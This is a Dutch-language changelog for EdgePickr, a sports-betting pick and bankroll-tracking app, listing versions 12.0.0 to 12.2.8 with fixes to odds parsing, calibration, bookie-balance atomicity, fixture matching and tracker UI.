# Changelog

Alle noemenswaardige wijzigingen aan EdgePickr. Formaat: [Keep a Changelog](https://keepachangelog.com/nl/1.1.0/), nieuwste eerst.

## [12.2.8] - 2026-04-25

**F5 · point-in-time was_preferred_at_log_time + v12.2.7 hotfix**

### Fixed

- **[CRITICAL hotfix]** v12.2.7's atomic-flip refactor verwijderde per ongeluk de `updateCalibration` call in `updateBetOutcome`. Sinds v12.2.7 werd calibratie bij nieuwe settled bets niet meer ge-update — `totalSettled` zou stoppen met tellen, multipliers blijven hangen. Hersteld in deze release.
- **[P1]** F5: nieuwe DB-kolom `was_preferred_at_log_time` op `bets` (default true). `writeBet` legt nu point-in-time vast of de bookie preferred was. `updateCalibration` filtert hierop ipv runtime `isPreferredBookie(bet.tip)` — voorkomt dat historische bets retrospectief uit calibratie vallen als operator z'n preferred-set wijzigt.
- Schema-tier-retry uitgebreid: pre-migratie schemas zonder de nieuwe kolom werken graceful via legacy-payload fallback. Vereiste migratie: `docs/migrations-archive/v12.2.8_was_preferred_at_log_time.sql`.

### Tests

685 passed, 0 failed. Snapshot/restore tests gebruiken nu unique filenames om cross-test pollution te vermijden.

### Notes

`isPreferredBookie` in `learning-loop.js` is nu fail-safe: als bet.was_preferred_at_log_time expliciet `false` is → skip. Indien `undefined` (legacy/pre-migratie bet) → fallback naar runtime check (huidig gedrag).

---

## [12.2.7] - 2026-04-25

**F3 · atomic outcome-flip met calibration snapshot/restore**

### Fixed

- **[P1]** `updateBetOutcome` voerde bij outcome-flip (W → L of vice versa) `revertCalibration` + `updateCalibration` na elkaar uit, zonder atomariteit. Als de tweede call gooide (Supabase-glitch, schema-mismatch) bleef calib half-gereverted: `totalSettled` telt fout, market-multipliers staan in onbekende staat.
- Fix: `lib/calibration-store.js` exporteert nu `snapshot()` (diepe-kopie van calib) en `restore(snap)` (atomic save terug). `lib/bets-data.js` `updateBetOutcome` neemt snapshot pre-flip; bij exception in revert/update wordt automatisch gerestored. Backwards-compat: snapshot/restore zijn optionele deps — zonder die deps blijft de oude flow.

### Tests
685 passed, 0 failed. 2 nieuwe: snapshot is diepe kopie + restore zet calib terug.

---

## [12.2.6] - 2026-04-25

**F2 · Atomic bookie-balance via Postgres RPC (race-condition fix)**

### Fixed

- **[P1]** `lib/bookie-balances.js` `applyDelta` deed read-calc-write zonder atomariteit. Twee concurrent W-outcomes op zelfde bookie konden de tweede update verliezen — direct geld-impact bij parallelle settlement.
- Fix: `applyDelta` roept nu primair `bookie_balance_apply_delta(p_user_id, p_bookie, p_delta)` Postgres RPC aan (atomic UPSERT met `balance += delta`). Fallback naar legacy read-calc-write blijft alleen actief als RPC ontbreekt (pre-migratie schema).
- Vereiste migratie: SQL-functie `bookie_balance_apply_delta` met `security definer` en `service_role grant execute`. Aparte SQL — niet in `docs/migrations-archive/` omdat het een function-create is, geen schema-mutatie.

### Tests
683 passed, 0 failed. 1 nieuwe test voor RPC-pad. 2 bestaande tests aangepast om RPC-mock te gebruiken (de fallback-test gebruikt expliciet `function does not exist`-error).

---

## [12.2.5] - 2026-04-25

**F7 · current-odds bookie-specifieke lookup**

### Fixed

- **[P2]** "Nu"-knop in tracker (`/bets/:id/current-odds`) pakte voorheen de hoogste preferred-bookie odd, niet de bookie van de bet zelf. Drift-percentage was misleidend (bv. Unibet @ 1.97 wordt vergeleken met Bet365 @ 1.86 → -5.58% drift, terwijl Unibet vs Unibet eerlijker was).
- Fix: lookup-volgorde is nu (1) exact match op `bet.tip`, (2) andere preferred bookies, (3) hele markt. Response bevat extra veld `priceSource: 'logged_bookie' | 'other_preferred' | 'market_best'`.
- UI toont symbool naast drift-percentage: geen mark = eigen bookie (apples-to-apples), ⚡ = andere preferred (eigen bookie had geen prijs), ⚠️ = niet-preferred bookie. Tooltip beschrijft de bron expliciet.

### Tests
682 passed, 0 failed.

---

## [12.2.4] - 2026-04-25

**F1 · rate-limit + cache fixture-resolver fallback (P0 DoS-vector)**

### Fixed

- **[P0]** Fallback `resolveFixtureIdForBet` in `lib/routes/bets-write.js` deed Supabase-query per call. Bulk-loop kon Supabase-quota uitputten (DoS-vector op availability). Toegevoegd:
  - **In-memory LRU cache** (max 1000 entries, TTL 30 min, key=`sport|datum|wedstrijd`). Negatieve resultaten ook gecachet om herhaalde lookups voor onbekende teams direct af te vangen.
  - **Per-user rate-limit** op de fallback-call (10/min/user). Bestaande `currentodds:`-limit (30/min) blijft gehandhaafd voor het hele endpoint.

### Tests

682 passed, 0 failed. 2 nieuwe: cache reuse + cache-of-null behavior.

---

## [12.2.3] - 2026-04-25

**Drop-reason telemetrie in mkP — diagnose 0-picks zaterdag**

### Added

- `lib/picks.js` `buildPickFactory` returnt nu `dropReasons` object dat per scan-loop telt waarom picks gedropt zijn (`price_too_low`, `ep_below_min`, `ep_too_close_to_market`, `kelly_too_low`, `no_signals`, `execution_gate_skip`, `edge_below_adaptive`).
- Helper `formatDropReasons(obj) → "key1=N · key2=M · ..."` voor compacte scan-log emit.
- Per-sport scan-bodies in `server.js` emitten nu een `🏀/🏒/⚾/🏈/🤾/⚽ Drops: ...` log-regel direct na de wedstrijden-geanalyseerd-regel. Geeft Bart per scan zichtbaar waar picks specifiek verloren gaan.

### Notes

Aanleiding: 0 picks op zaterdag 07:30 terwijl alle sporten honderden wedstrijden hadden. Admin-endpoint analyse toonde 73% van v2-rejections als `edge_below_min` — geen pipeline-bug, model haalt vaak de 5.5% drempel niet. v1-pipeline (UI) heeft extra gates die v2 niet kent. Drop-reason logging maakt nu zichtbaar welke gate de bottleneck is per scan.

### Tests
680 passed, 0 failed. 6 nieuwe tests voor dropReasons + formatDropReasons.

---

## [12.2.2] - 2026-04-24

**Bookie-balance "+ toevoegen" knop**

### Fixed

- **[P1]** Bookie-bankroll panel had vanuit lege state geen manier om een eerste bookie te initialiseren — enkel "klik-op-bedrag-om-aan-te-passen" werkte, en die knopjes bestonden pas nadat er een bookie was. Toegevoegd: `+ Bookie` knop die via twee prompts een bookie + startsaldo registreert.

---

## [12.2.1] - 2026-04-24

**iOS Safari hardening voor bottom-nav**

### Fixed

- **[P2]** Op mobiel Safari bleef de `.bottom-nav` niet consistent aan de onderkant plakken tijdens momentum-scroll of address-bar toggle. Oorzaak: zonder eigen GPU-layer repainte Safari de fixed element onbetrouwbaar tijdens scroll.
- Fix: `transform: translate3d(0,0,0)` + `will-change: transform` forceert een composite layer. `bottom: env(safe-area-inset-bottom, 0)` plaatst de nav correct boven de iPhone home-indicator ipv dat de padding dat moet opvangen. Fallback voor browsers zonder `backdrop-filter` (opaque background).

---

## [12.2.0] - 2026-04-24

**Per-bookie bankroll tracking (🇳🇱 oversluis-radar)**

### Added

- **Nieuwe tabel `bookie_balances`** (zie `docs/migrations-archive/v12.2.0_bookie_balances.sql`). Eén rij per (user, bookie) met `balance`. Service-role RLS policy. Draai de migratie vóór deploy.
- **Module `lib/bookie-balances.js`** — pure balance-math (`betBalanceImpact`, `transitionDelta`) + Supabase-store (`listBalances`, `setBalance`, `applyDelta`, hook-functies).
- **Bet-flow hooks** in `lib/bets-data.js` (transparant, no-op als `bookieBalanceStore` niet ge-inject):
  - `writeBet(Open)` → balance −= inzet
  - `updateBetOutcome(W)` → balance += inzet × odd (payout)
  - `updateBetOutcome(L)` → balance ongewijzigd (stake al afgeschreven)
  - `deleteBet` → reverse de cumulatieve impact (stake teruggeven bij Open/L, winst teruggeven bij W)
- **API-endpoints** (`lib/routes/bookie-balances.js`):
  - `GET /api/bookie-balances` → `{ balances, total, lowAlerts }`
  - `PUT /api/bookie-balances/:bookie` `{ balance }` → initialiseren of correctie
- **UI-panel** op tracker-tab (tussen stats-grid en "Uitslagen ophalen"): kaartjes per bookie met kleur-indicatie (rood < €25, geel < €50, groen ≥ €50), totaal = bankroll, klik-to-edit bedrag, alert-banner als een bookie onder de 1-unit-drempel zakt. Auto-refresh na elke bet-wijziging.

### Notes

- Balances kunnen negatief worden (edge case: oude bets die niet via hooks zijn gelogd). Handmatige correctie via klik op het bedrag.
- Bookie-naam in DB is lowercase-genormaliseerd (`Bet365` / `bet365` / `BET365` → `bet365`); UI toont de canonieke vorm zoals in `bets.tip`.
- Initialiseer handmatig voor bestaande bookies: klik op ieder bookie-veld en vul het actuele saldo in. Bart's startstate (post-setup): Bet365 €101.95 · Unibet €109.95 · BetMGM €25 · Toto €25 · BetCity €25 · 888sport €41.37.

### Tests

674 passed, 0 failed. 11 nieuwe tests in bookie-balance suite: impact-berekening Open/W/L, alle 4 outcome-transitions, normalisatie, `applyDelta` cumulatief, `onBetWritten` + `onBetOutcomeChanged` hook-integratie.

---

## [12.1.12] - 2026-04-24

**NHL TT scope-based filter (ipv alleen bookie-blacklist)**

### Fixed

- **[P1]** Sommige bookies (o.a. Unibet NL) bieden hockey TT als twee aparte markten aan: "Reguliere Speeltijd" (60-min) én "Inclusief Verlenging" (incl-OT). De v11.3.32 bookie-blacklist gooide alle Unibet TT-entries weg, óók de legitieme incl-OT variant die wél met ons Poisson-model (lambda+0.023 OT-bump) matcht. Gevolg: operator zag Bet365 @ 1.86 terwijl Unibet's incl-OT @ 1.97 prijs beschikbaar was.
- `parseGameOdds` detecteert nu NL labels (`reguliere speeltijd`, `inclusief verlenging`, `excl. ot`) naast EN labels en zet `teamTotals[].scope` op `'regulation'` / `'incl_ot'` / `'unknown'`.
- Hockey TT scan-filter (`server.js:3609`) gebruikt nu een scope-first check:
  - `scope === 'regulation'` → altijd weg (zeker fout)
  - `scope === 'incl_ot'` → altijd houden (zeker goed)
  - `scope === 'unknown'` → valt terug op `HOCKEY_60MIN_BOOKIES` blacklist als vangnet

### Notes

- Hockey ML blacklist blijft ongewijzigd: ML-settlement (push bij 60-min gelijkspel vs W/L incl-OT) is een ander risico en Bart heeft dat niet per bookie geverifieerd.
- Bookie-blacklist voor Toto/BetCity/Ladbrokes blijft intact voor `scope='unknown'`. Toto labelt zelf expliciet "EXCL. OT" (dan pakt scope-filter 'm al).

### Tests

5 nieuwe tests voor `parseGameOdds` TT scope-detectie (EN regulation/incl-OT + NL reguliere/inclusief + unknown fallback).

---

## [12.1.11] - 2026-04-24

**Cap-bypass fix bij uitbreiden preferred-bookies**

### Fixed

- **[P1]** `bestFromArr` gaf altijd de hoogste prijs uit de (preferred) pool terug, ook als die prijs boven de markt-specifieke cap uitkwam (≤ 3.5 voor O/U, MAX_WINNER_ODDS=4.0 voor ML, 8.0/15.0 voor 3-way Draw). Gevolg: bij uitbreiden van de preferred-list (bv. toevoegen 888sport/BetMGM) kon een longshot-quote van de nieuwe bookie de dedupe-winnaar worden → cap-check dropt de héle `(markt, lijn)` pick → Bet365's binnen-cap prijs (bv. 2.10) werd niet meer beschouwd.

### Changed

- `bestFromArr(arr, { maxPrice })` filtert kandidaten boven cap al in de dedupe. Nu wint de hoogste prijs *binnen* cap; valt terug naar next-best binnen cap als top-bookie boven cap zit. Toegepast op 14 call-sites in `server.js`: basketball ML, basketball 1H O/U, hockey ML, hockey 3-way, hockey TT home/away, hockey P1 O/U, baseball ML, F5 ML, NFL ML, NFL 1H O/U, handball ML, handball 3-way. Backwards-compat: call-sites zonder `maxPrice` ongewijzigd.

### Tests

655 passed, 0 failed. 4 nieuwe tests:
- `bestFromArr maxPrice: hoogste boven cap → fallback naar next-best binnen cap`
- `bestFromArr maxPrice: geen bookie binnen cap → price=0`
- `bestFromArr maxPrice: MAX_WINNER_ODDS (4.0) cap voor ML-sites`
- `bestFromArr maxPrice: geen cap → standaard-gedrag (hoogste wint)`

---

## [12.1.10] - 2026-04-23

**Inbox cleanup + manual CLV clear**

### Fixed

- **[P1]** Tracker-bets met foutieve CLV kunnen nu handmatig worden opgeschoond via `DELETE /api/bets/:id/clv` en een directe `✕`-actie in de betstabel. Dit wist `clv_odds`, `clv_pct`, `sharp_clv_odds` en `sharp_clv_pct` voor precies één bet.
- **[P1]** De Inbox-tab bewaart nu een eigen feed-state in plaats van te leunen op gedeelde `model-feed` state. Daardoor verdwijnen mirrored items niet meer na tab-wissels, filters of partiële refreshes.
- **[P1]** Alleen inbox-waardige notification-types worden nog naar de Inbox gemirrord. Transient scan-ruis zoals `scan_end` en `cron_tick` verschijnt daar niet meer.
- **[P2]** `Wis alles` in de notificatie-bel verwijdert nu alleen transient notifications en bewaart systeemkritische meldingen zoals `stake_regime_transition` en `odds_drift`, zodat de Inbox niet meer onbedoeld leeggetrokken wordt.

### Tests

654 passed, 0 failed.

---

## [12.1.9] - 2026-04-23

**Stake-regime UX + Inbox mirror**

### Changed

- **[P2]** Stake-regime fallback bij `50-99` settled bets heet nu `early_caution` in plaats van opnieuw `exploratory`. De sizing blijft bewust voorzichtig (`Kelly 0.35`, unit ×1.0), maar de naam/reason maakt nu duidelijk dat de teller niet fout is.
- **[P2]** De Inbox-tab mixt nu ook recente rows uit de Supabase `notifications` tabel in de model-feed. Daardoor zijn `stake_regime_transition`, odds-drift, CLV-backfill en heartbeat/systemmeldingen zichtbaar in de Inbox-tab, niet alleen in de notificatie-bel.

### Tests

Zie release-run.

---

## [12.1.8] - 2026-04-23

**Hockey TT CLV + stake-regime consistency**

### Fixed

- **[P1]** NHL team-total `TT Over/Under` odds/CLV lookup matcht nu op de exacte `Home/Away Team Total` markt met wedstrijd-context. De resolver mag niet meer terugvallen naar game-total `Over/Under`, maar kan TT nu wel correct vinden wanneer home/away uit `wedstrijd` afleidbaar is.
- **[P1]** Current-odds refresh gebruikt voor basketball/hockey/baseball/NFL/handball nu de juiste API-Sports parameter (`game`) in plaats van altijd `fixture`. Dit maakte non-football odds-refresh kwetsbaar.
- **[P1]** Odds-drift monitor gebruikt nu de centrale strict market resolver en sport-specifieke odds endpoints. Daardoor krijgt NHL TT geen false drift-alerts meer vanuit game totals.
- **[P2]** Snapshot-CLV fallback filtert nu ook exact op `line`, zodat `Over/Under 2.5` nooit een andere line uit `odds_snapshots` kan pakken.
- **[P2]** `drawdown_soft` Kelly is verlaagd van `0.40` naar `0.30`. Een win die het systeem uit drawdown haalt schaalt nu logisch omhoog naar `exploratory` (`0.35`) in plaats van omlaag.

### Tests

651 passed, 0 failed.

---

## [12.1.7] - 2026-04-22

**Scan-volume boost + hockey TT-parity**

### Changed

- **[P2]** `MIN_CONFIDENCE` voor voetbal picks van 0.025 → 0.015. Na v12.0.x stapeling van strengere sanity/divergence/parser gates kwamen er systematisch 0-1 picks per scan uit terwijl de v2 pipeline 60 kandidaten/48u accepteerde. 0.015 laat iets meer picks door zonder de quality-gates te raken (die hebben al hun eigen divergence + price-range + sigCount=0 checks).

### Fixed

- **[P2]** Hockey picks gingen niet door een strength-filter zoals voetbal. Gevolg: zwakke TT-edges kwamen altijd door terwijl hockey ML picks zelden doorkwamen (price_too_low op favorieten + edge_below_min). Gate-parity: hockey krijgt nu dezelfde `strength >= 0.015`-drempel. Logt `🏒 Confidence-filter: X van Y hockey picks < 0.015 strength` wanneer picks dropen.

### Notes

- Odds_snapshots (240MB = 83% van DB) is normaal: retention draait dagelijks (30 dagen TTL) via `lib/runtime/maintenance-schedulers.js:72`. 500MB Supabase free-tier limit → 48% gebruik, ruim.
- DB-capacity alerts: Supabase zelf mailt bij 80%/100%. Inbox-alert in `notifications-feed.js:121` gebruikt bet-count × 0.002MB estimate (mist `odds_snapshots` compleet) — separaat fix-kandidaat, niet in deze release.

---

## [12.1.6] - 2026-04-20

**Fixture-resolver matcht team-naam varianten (club-prefix strip)**

### Fixed

- **[P1]** `fixtures`-tabel bewaart API-namen met club-prefix (bv. `US Lecce`, `ACF Fiorentina`, `AS Roma`) terwijl `bet.wedstrijd` meestal korte versies bevat (`Lecce`, `Fiorentina`). Resolver matchte daardoor niet. Toegevoegd: token-overlap fallback met strip van diacritics en generic club-codes (FC/SC/AC/AS/US/ACF/AFC/CF/CD/CA/SV/BV/VV/RC/RCD/CS/NK/HK/FK/TSV/RSC/RK/club/team). Echte team-namen (`Oilers`, `Bruins`, etc.) blijven onderscheidend.

### Notes

- Edmonton-bet werkt nu vanaf v12.1.5 (sport-normalisatie). Bij "Geen odds beschikbaar bij api-sports" gaat het om een legitieme API-state (fixture bestaat maar bookies hebben nog geen odds gepubliceerd), niet om een bug.

### Tests
647 passed, 0 failed. 1 nieuwe: club-prefix variant match (US Lecce ↔ Lecce + ACF Fiorentina ↔ Fiorentina).

---

## [12.1.5] - 2026-04-20

**Odds-endpoint accepteert nu Dutch sport-label + home/away swap-fallback**

### Fixed

- **[P1]** `/api/bets/:id/current-odds` deed `bet.sport.toLowerCase()` zonder normalisatie; `IJshockey` → `ijshockey` viel daardoor uit de `hostMap` en de endpoint gaf "Sport 'ijshockey' heeft geen odds-endpoint", ook nadat v12.1.4 de fixture succesvol had gekoppeld. Fix: `normalizeSportKey` wordt nu ook in de endpoint toegepast, dus Dutch + English labels werken allebei.
- **[P2]** Fixture-resolver krijgt extra swap-check: als forward-match (bet-home ↔ fixture-home) geen hit geeft, wordt alsnog (bet-home ↔ fixture-away) geprobeerd. Vangt bets waarin teams in omgekeerde volgorde staan vs. de API-truth in de fixtures-tabel.

### Tests
646 passed, 0 failed. 1 nieuwe: home/away swap-fallback.

---

## [12.1.4] - 2026-04-20

**Fixture-resolver matcht nu Dutch sport-labels + varianten in team-naam**

### Fixed

- **[P1]** v12.1.3 fallback-resolver vond nóg steeds geen match: `bet.sport` wordt als Dutch UI-label opgeslagen (`Voetbal`, `IJshockey`, ...) maar `fixtures.sport` = internal API-key (`football`, `hockey`, ...). De `.eq('sport', …)` filter matchte dus nooit. Toegevoegd: `SPORT_LABEL_TO_KEY`-mapping die zowel Dutch als English varianten accepteert.
- **[P2]** Team-matching uitgebreid met first-word fallback: "Edmonton Oilers" ↔ "Edmonton" matcht nu via eerste-woord-vergelijking (mits ≥4 chars), naast de bestaande exact/substring match. Voorkomt missed lookups als fixtures-tabel afgekorte team-namen heeft.

### Tests
645 passed, 0 failed. 2 nieuwe: Dutch sport label mapping + first-word team match.

---

## [12.1.3] - 2026-04-20

**Fallback fixture_id-lookup voor pre-v12.1.1 bets**

### Fixed

- **[P2]** "🔄 Huidige odds ophalen" toonde "Geen fixture_id gekoppeld" voor alle bets die vóór v12.1.1 waren gelogd. Die hadden `fixture_id=NULL` in de DB en blokkeerden de odds-refresh hard. Fix: `/api/bets/:id/current-odds` probeert nu eerst een fallback-resolve via de `fixtures`-tabel (sport + datum-window ±36u + team-substring-match). Bij één unieke hit wordt `fixture_id` ook meteen teruggeschreven naar de bet-row, zodat volgende refreshes direct werken zonder fallback.

### Tests
643 passed, 0 failed. 3 nieuwe: `resolveFixtureIdForBet` exact match + geen match + malformed input.

---

## [12.1.2] - 2026-04-20

**Tracker UX · vandaag-teller + gisteren-filter**

### Fixed

- **[P2]** "Pot. profit today (N bets)" telde strikt `datum === vandaag` en miste daardoor nachtwedstrijden die op morgen-datum staan (bv. NHL 04:00). Tracker-tabel toonde wél beide bets onder "Vandaag" (from=vandaag, to=morgen), waardoor de kop-teller inconsistent was met de tabel. Fix: `calcStats.todayBets` telt nu ook bets met `datum = morgen` én `tijd < 06:00` mee — symmetrisch met de tracker-filter.

### Added

- **"Gisteren"-knop** in tracker periode-selector (tussen Vandaag en 7d). Strikt yesterday (from=gisteren, to=gisteren). `setPeriod(-1, …)` uitgebreid voor deze shortcut.

### Tests
640 passed, 0 failed. 1 nieuwe: `calcStats.todayBetsCount includes tomorrow night-games`.

---

## [12.1.1] - 2026-04-19

**Operator-rapport follow-up · William Hill + fixtureId-koppeling**

### Fixed

- **[P1]** William Hill toegevoegd als bookie-optie op 4 plekken in UI: bet-logging select (`#f-bookie` / `#m-bookie`), tracker-edit dropdown, en settings-picker. Voorheen alleen Bet365/Unibet/Toto/Pinnacle in de korte list en William Hill ontbrak ook uit de uitgebreide settings-lijst.
- **[P1]** Scan-picks geven nu `fixtureId` door naar frontend via orchestrator `toSafe()`. Voorheen werd `p._fixtureMeta.fixtureId` wel intern gebruikt (voor post-scan gate) maar niet geprojecteerd naar de UI-pick. Gevolg: `modalPick.fixtureId = undefined` bij bet-logging → POST /api/bets stuurt `null` → DB-row heeft geen fixture_id → "🔄 Huidige odds ophalen" button toont "Geen fixture_id gekoppeld". Fix: `toSafe()` kopieert nu `fixtureId` naar de safe-pick-projection. Alle nieuwe bets krijgen vanaf nu fixture_id gekoppeld in DB.

### Tests
639 passed, 0 failed.

---

## [12.1.0] - 2026-04-19

**Operator-rapport-cluster · 8 runtime bugs + data-hygiëne fix**

Release gebundelt uit operator-rapport 2026-04-19 avond. Bart meldde bewijs
van meerdere runtime bugs met directe geldverlies-risico (verkeerde bet-
settlement, absurde CLV-rapport, verkeerde push-notificaties). Elke fix is
als eigen commit (v12.1.0-a t/m -h) gepusht zodat rollback granulair is.

### Fixed

- **[P0 · 12.1.0-a]** `index.html` live-sync team-matching + TT-markt skip. Frontend live-sync matchte bet op **eerste woord** van teamnaam → "Tampa Bay Lightning vs Montreal" bet matchte met "Pittsburgh Pirates vs Tampa Bay Rays" MLB fixture op woord "tampa" → push "Under 3.5 gebroken" voor verkeerde wedstrijd. Plus: Team Total markten triggerden op game-total goals (TT meet één team's score, niet sum). Fix: strictere team-match (beide teams verplicht, ≥4 chars substring of laatste-woord nickname ≥5 chars) + sport-filter + TT-markt skip in live O/U-sync.
- **[P0 · 12.1.0-b]** `lib/clv-match.js` CLV + pre-kickoff check skipt nu TT-markten. `resolveOddFromBookie` en `marketKeyFromBetMarkt` matchten "Under 3.5" via game-total regex → pakte NHL full-game Under line (5.75) voor TT Under 3.5 (1.95) → CLV -66% rapport. Fix: expliciete TT-detect + return null. Liever geen CLV dan foute CLV; TT-CLV vereist aparte snapshot-structuur die er nu niet is.
- **[P0 · 12.1.0-c]** `lib/runtime/results-checker.js` Team Total settlement. TBL vs MTL 3-4 met bet "TBL TT Under 3.5": tracker toonde L (verloren) terwijl TBL scoorde 3 → Under 3.5 = W. Resultaat: results-checker viel door naar Generic Under, gebruikte total=scoreH+scoreA=7, 7>3.5 → L. Fix: Team Total regex-detect vóór Generic O/U; gebruikt team's individuele score (scoreH óf scoreA) op basis van home/away match.
- **[P1 · 12.1.0-d]** `lib/runtime/live-board.js` V1_LIVE_STATUSES uitgebreid. Operator: "live NHL werkt niet". Ontbraken: `PT` (penalties/shootout, ~10% NHL games) en `INT` (intermission). Games in die statuses werden niet als live herkend → geen score-update in live-board. Fix: beide statuses toegevoegd.
- **[P1 · 12.1.0-e]** `lib/learning-loop.js` filter op preferred bookies. Operator: "bookies die uit staan toch meetellen in learning data — niet legaal in NL, zal nooit aanvinken". Voorheen telden ALLE settled bets mee voor calibratie, ongeacht bookie. Nu: learning-data alleen op preferred-bookies via nieuwe `getPreferredBookies` dep. Fail-open bij ontbrekende dep of lege set (backward compat).
- **[P1 · 12.1.0-f]** `lib/modal-advice.js` unit-advies consistent met score bij betere odds. Operator: "bet geplaatst @ 1.95 ipv 1.86 (+4.8%), score sprong van 6/10 → 10/10 maar unit-advies bleef 0.5U". Voorheen capte tier-5 ('better') altijd op `origUnits` terwijl score op `max(origScore, freshScore)` ging. Fix: bij diffPct ≥ +4% mag units 1 bucket omhoog (gecapt op pureRec). Score volgt de rec-units.
- **[P2 · 12.1.0-g]** `index.html` signal-performance toont 'shadow' bij weight=0. Operator verwarring "overal 0x". Niet bug maar mislabelling — weight=0 is doctrine-correct voor shadow-mode. Nu explicit label + tooltip.
- **[P1 · 12.1.0-h]** `lib/routes/admin-signals.js` Model-tab perSport telling. Operator: "aantal bets per sport (voetbal) in Model tab al hoger dan totaal in tracker". Oude `key.slice(0, idx)` pakte 'btts' als sport voor 'btts_yes' (= football-markt), en legacy `home` + nieuwe `football_home` telden BEIDE onder football → dubbele telling. Fix: whitelist-based sport-detection (football/basketball/hockey/baseball/american-football/handball only); alles buiten die whitelist valt onder football.

### Niet in deze release (follow-up)

Operator-vragen met grotere scope:
- **Early payout** activeren als actieve signal (nu shadow log). Wacht tot data schoon.
- **SofaScore API / grotere sports-API** evaluatie. Huidige stack is capable; eerst v12.1 stabiel laten draaien.
- **NHL team total tegenstander-positie + H2H weging**. Legit architectural issue: `λ_home = expHome + 0.023` meet alleen team's eigen output, niet opponent-defense of pace. Volwaardige herziening in v12.2 als apart architectural document.
- **Vervuilde calibratie-rollback**. Bart kan via tracker UI verkeerd-gesettlede bets (zoals TBL TT Under 3.5 dat als L geboekt staat) handmatig op W zetten — `revertCalibration` wordt dan automatisch getriggerd.

### Tests
639 passed, 0 failed.

---

## [12.0.2] - 2026-04-19

**Bugfix · analyse-tab toont nu alle picks (multi-sport) i.p.v. alleen voetbal**

### Fixed

- **[P1]** Operator-rapport na v12.0.1: scans-tab toonde 2 picks (BTTS voetbal + hockey TT Under), analyse-tab toonde er maar 1 (alleen BTTS). Root cause: `_atomicSetPrematch(finalPicks)` werd alleen door `runPrematch()` (football-slot) aangeroepen met alleen football picks. `/api/picks` (= analyse-tab source) leest die module-state → alleen football. De orchestrator merged wel alle sports maar schreef de gemergde set niet terug. SSE-stream naar scans-tab gebruikte een andere code-path en had de volledige set dus wel. Fix: orchestrator krijgt nu een `setLastPrematchPicks` dep en schrijft na merge `allPicks` terug, zodat scans-tab en analyse-tab consistent dezelfde set tonen.

### Tests
638 passed, 0 failed.

---

## [12.0.1] - 2026-04-19

**P0 hotfix · absurde 1H Over odds (bv. 34.0) geblokkeerd**

### Fixed

- **[P0]** Operator-rapport 2026-04-19 na v12.0.0 deploy: NBA 1H Over 110.5 pts pick met Bet365 @ **34.0** (zou 2.0U × +€1012 expectedEur hebben opgeleverd, absoluut onrealistisch). Root cause = stapeling van 3 latent bugs die samen tot catastrofe leidden toen v12.0.0's `dedupeBestPrice` de outlier-prijs niet meer onderdrukte:
  1. **Parser had geen price sanity-cap**. Api-sports retourneerde ergens een 34.0 odd op een 1H Over-markt (data-corruptie of verkeerde markt-koppeling). Pre-v12.0.0 onderdrukte `dedupeMainLine` de outlier door de laagste prijs te kiezen; post-v12.0.0 `dedupeBestPrice` pakte hem op. Fix: `lib/odds-parser.js` drop alle totals/spreads/halfTotals/halfSpreads/teamTotals quotes met `price < 1.10 || price > 10.0`. O/U-markten hebben per definitie geen prijzen buiten die range.
  2. **1H/P1 O/U markten misten `price <= 3.5` upper bound**. Alleen full-game O/U had dit. Fix: server.js:2960, 2964, 3768, 3772, 4926, 4930 — toegevoegd aan basketball/hockey/NFL 1H + hockey P1 O/U.
  3. **`passesDivergence2Way` fail-opent bij `tot < 1.0`**. Extreme paired odds (34 vs 1.10) geven tot=0.938 → oude code `!(tot >= 1.0 && tot < 1.15)` → fail-open → gate laat pick door. Fix: fail-closed op `tot < 0.98 || tot >= 1.15`. Nieuwe test: 34+1.10 paired → gate faalt → pick dropt.

### Why
v11.3.32 toonde al Bet365 @ 34 odd voor dezelfde 1H Over 110.5 pick. De absurde odds bestonden al een tijd, maar werden gemaskeerd door mildere Kelly-staking (drawdown_soft). v12.0.0's nieuwe `dedupeBestPrice` + 0-signal drop filter maakte de ranking agressiever, en de 34-odd-pick klom naar top-2 met 2.0U stake = catastrofaal advies. Het was dus niet één nieuwe bug maar drie latente defects die de v12.0.0 release ontmaskerde.

### Tests
638 passed, 0 failed. 2 nieuwe unit-tests: `vig-out-of-range → fail-closed` en `extreme odds paired (34 vs 1.10) → fail-closed`.

---

## [12.0.0] - 2026-04-19

**Foundational release · parser correctness + calibration integrity + signal discipline**

Release na gecombineerde audits van Claude (Opus 4.7) en Codex (GPT-reviewer). Operator-directive: "v12.0.0 moet weken stabiel draaien, geen steeds gerepareerde release." Dekking: parser-laag bugs die tot valse picks leiden, calibratie cross-market contamination, learning-loop break-even fouten, signal-discipline.

### Fixed — Parser correctness (Codex P0's)

- **[P0]** `lib/odds-parser.js:129` — Scope-isolatie voor `betId === 2/3` full-game totals/spreads. Voorheen werden period/half/F5 bets **ook** naar full-game `tots`/`spr` gepusht als de betId 2 of 3 was, ongeacht bet.name. Codex reproduceerde: een payload met alleen "1st period over/under 1.5" leverde 1.5 op in zowel totals als halfTotals → scanner zag period-price als full-game value → false edges. Nu: `isHalfOrF5Bet` guard filtert half/period/F5/quarter-variant expliciet uit vóór full-game push.
- **[P0]** `lib/odds-parser.js:218, 129` — Settlement-scope label (`regulation`/`incl_ot`/`unknown`) op totals + team-totals + spreads. Parser detecteert nu via `bet.name` of een quote expliciet "regulation", "60 min" of "incl OT/overtime" is. Downstream kan daarop filteren. Voor hockey totals: scope-filter `scope !== 'regulation'` + `isOTBookieHockey()` op bookie (server.js:3652). v11.3.32's smallere fix (alleen team-totals) is nu uitgebreid naar alle hockey totals.
- **[P0]** `server.js:2867, 2944, 3663, 3747, 4228, 4402, 4784, 4893, 5301` — Exact line matching (`< 0.01` i.p.v. `< 0.6`) op alle non-football totals in basketball/hockey/baseball/NFL/handball. Zelfde bug-klasse als v11.3.29 op football Over 2.5: voorheen mixte `main line ±0.5` alternate lines (bv. 220 bij 220.5) zodat een 220 prijs kon winnen voor een pick gelabeld als "Over 220.5".
- **[P1]** `lib/odds-parser.js:269` — `dedupeMainLine` bewaarde bij duplicates de laagste prijs ("risico-demping bij parser-lekken"). Dat hield juist de slechtste variant vast. Nu: alle dedupes gebruiken `dedupeBestPrice`. Dedupe-key voor totals/spreads/teamTotals inclusief `scope` zodat regulation/incl_ot niet meer elkaar overschrijven.

### Fixed — Calibration integrity (Claude P0/P1 + Codex P1)

